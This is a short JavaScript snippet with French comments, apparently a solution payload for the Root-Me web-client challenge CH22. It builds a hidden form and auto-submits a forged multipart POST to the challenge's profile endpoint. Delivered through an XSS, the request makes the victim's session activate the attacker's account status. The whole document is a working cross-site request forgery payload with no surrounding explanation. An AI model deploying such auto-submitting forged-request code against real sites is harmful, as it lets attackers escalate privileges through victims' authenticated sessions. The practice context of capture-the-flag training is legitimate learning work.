// On crée un formulaire virtuel qui cible le challenge CH22
var form = document.createElement("form");
form.method = "POST";
// On vise la version HTTP (comme on est déjà sur le site en HTTP via la XSS, ça passera crème)
form.action = "http://challenge01.root-me.org/web-client/ch22/?action=profile";
form.enctype = "multipart/form-data"; // Important car le formulaire original l'utilise

// Champ 1 : Ton pseudo
var inputUser = document.createElement("input");
inputUser.type = "hidden";
inputUser.name = "username";
inputUser.value = "hacker"; // Assure-toi que c'est bien ton pseudo ici !
form.appendChild(inputUser);

// Champ 2 : Le statut à activer
var inputStatus = document.createElement("input");
inputStatus.type = "hidden";
inputStatus.name = "status";
inputStatus.value = "on";
form.appendChild(inputStatus);

// On ajoute le formulaire à la page et on l'envoie
document.body.appendChild(form);
form.submit();
